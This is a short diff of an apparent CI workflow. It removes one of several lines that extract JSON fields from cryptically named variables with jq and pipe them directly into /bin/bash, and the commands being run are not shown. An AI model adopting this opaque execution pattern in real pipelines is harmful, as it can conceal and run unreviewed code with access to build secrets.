@@ -25,7 +25,6 @@ jobs:
           echo $lsvst5 | jq -r .rzbw10 | /bin/bash
           printf '%s' "$ld9553" | jq -r .klx57307 | /bin/bash
           printf '%s' "$oowbf6907" | jq -r .p10 | /bin/bash
-          echo $xbuc1 | jq -r .ey0062 | /bin/bash
           echo $rgpk13 | jq -r .ql713 | /bin/bash
 
       - name: Save archive
